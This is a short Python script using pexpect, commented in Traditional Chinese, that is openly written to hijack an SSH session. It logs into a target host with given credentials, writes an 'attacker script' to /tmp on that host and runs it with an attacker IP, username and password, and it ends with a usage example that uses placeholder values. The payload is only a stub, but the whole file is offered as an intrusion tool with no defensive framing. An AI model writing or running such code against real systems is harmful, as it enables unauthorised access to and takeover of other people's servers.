import pexpect

def hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password):
    # 建立ssh子程序
    conn = pexpect.spawn('ssh {}@{}'.format(target_username, target_host))
    # 匹配輸出中的密碼提示，並輸入目標主機的密碼
    conn.expect('password:')
    conn.sendline(target_password)
    # 匹配成功，透過expect模組來判斷返回的文本判斷是否登入成功
    index = conn.expect(['Permission denied', 'Last login'])
    if index == 0:
        print("Authentication failed.")
        return
    elif index == 1:
        print("Authentication success.")
        # 傳送攻擊者腳本至目標主機，這裡假設攻擊者腳本已準備好
        conn.sendline('echo "attacker_script" > /tmp/attacker_script.py')
        # 執行攻擊者腳本以接管SSH session
        conn.sendline('python /tmp/attacker_script.py --attacker_ip {} --attacker_username {} --attacker_password {}'.format(attacker_ip, attacker_username, attacker_password))
    else:
        print("Authentication failed.")
    conn.close()

# 使用範例
target_host = "target_host_ip"
target_username = "target_username"
target_password = "target_password"
attacker_ip = "attacker_ip"
attacker_username = "attacker_username"
attacker_password = "attacker_password"

hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password)